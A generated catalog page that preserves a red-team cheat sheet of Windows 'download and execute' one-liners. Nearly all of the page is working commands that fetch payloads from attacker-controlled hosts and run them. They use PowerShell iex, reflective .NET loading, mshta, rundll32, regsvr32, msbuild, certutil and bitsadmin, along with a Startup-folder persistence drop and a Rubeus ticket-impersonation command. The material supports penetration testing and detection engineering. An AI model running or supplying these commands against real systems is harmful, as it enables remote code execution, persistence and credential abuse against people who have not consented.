---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Windows - Download and execute methods

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-redteam-access-windows-download-execute` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/access/windows-download-execute.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Windows - Download and execute methods](../../topics/redteam/windows-download-and-execute-methods.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-redteam-access-windows-download-execute |
| name | Windows - Download and execute methods |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/redteam/access/windows-download-execute.md |

## Preserved Source Material

````yaml
_body: "# Windows - Download and execute methods\n\n## Downloaded files location\n\n- C:\\Users\\<username>\\AppData\\Local\\\
  Microsoft\\Windows\\Temporary Internet Files\\\n- C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\\
  IE\\<subdir>\n- C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Temp\\TfsStore\\Tfs_DAV\n\n## Powershell\n\n\
  From an HTTP server\n\n```powershell\npowershell -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex\"\
  \n\n# Download only\n(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/PowerUp.ps1\", \"C:\\Windows\\\
  Temp\\PowerUp.ps1\")\nInvoke-WebRequest \"http://10.10.10.10/binary.exe\" -OutFile \"C:\\ProgramData\\Microsoft\\Windows\\\
  Start Menu\\Programs\\StartUp\\binary.exe\"\n\n# Download and run Rubeus, with arguments\n$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/Rubeus.exe')\n\
  $assem = [System.Reflection.Assembly]::Load($data)\n[Rubeus.Program]::Main(\"s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e\
  \ /impersonateuser:administrator /msdsspn:cifs/file01 /ptt\".Split())\n\n# Execute a specific method from an assembly \n\
  $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/lib.dll')\n$assem = [System.Reflection.Assembly]::Load($data)\n\
  $class = $assem.GetType(\"ClassLibrary1.Class1\")\n$method = $class.GetMethod(\"runner\")\n$method.Invoke(0, $null)\n```\n\
  \nFrom a Webdav server\n\n```powershell\npowershell -exec bypass -f \\\\webdavserver\\folder\\payload.ps1\n```\n\n## Cmd\n\
  \n```powershell\ncmd.exe /k < \\\\webdavserver\\folder\\batchfile.txt\n```\n\n## Cscript / Wscript\n\n```powershell\ncscript\
  \ //E:jscript \\\\webdavserver\\folder\\payload.txt\n```\n\n## Mshta\n\n```powershell\nmshta vbscript:Close(Execute(\"GetObject(\"\
  \"script:http://webserver/payload.sct\"\")\"))\n```\n\n```powershell\nmshta http://webserver/payload.hta\n```\n\n```powershell\n\
  mshta \\\\webdavserver\\folder\\payload.hta\n```\n\n## Rundll32\n\n```powershell\nrundll32 \\\\webdavserver\\folder\\payload.dll,entrypoint\n\
  ```\n\n```powershell\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";o=GetObject(\"script:http://webserver/payload.sct\"\
  );window.close();\n```\n\n## Regasm / Regsvc @subTee\n\n```powershell\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\\
  regasm.exe /u \\\\webdavserver\\folder\\payload.dll\n```\n\n## Regsvr32 @subTee\n\n```powershell\nregsvr32 /u /n /s /i:http://webserver/payload.sct\
  \ scrobj.dll\n```\n\n```powershell\nregsvr32 /u /n /s /i:\\\\webdavserver\\folder\\payload.sct scrobj.dll\n```\n\n## Odbcconf\n\
  \n```powershell\nodbcconf /s /a {regsvr \\\\webdavserver\\folder\\payload_dll.txt}\n```\n\n## Msbuild\n\n```powershell\n\
  cmd /V /c \"set MB=\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe\" & !MB! /noautoresponse /preprocess\
  \ \\\\webdavserver\\folder\\payload.xml > payload.xml & !MB! payload.xml\"\n```\n\n## Certutil\n\n```powershell\ncertutil\
  \ -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\\Windows\\\
  Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil /logfile= /LogToConsole=false /u payload.dll\n```\n\n```powershell\n\
  certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe\n\
  ```\n\n## Bitsadmin\n\n```powershell\nbitsadmin /transfer mydownloadjob /download /priority normal http://<attackerIP>/xyz.exe\
  \ C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\local\\\\temp\\\\xyz.exe\n```\n\n## References\n\n- [arno0x0x - Windows oneliners\
  \ to download remote payload and execute arbitrary code](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)"
_relative_path: redteam/access/windows-download-execute.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/access/windows-download-execute.md
````
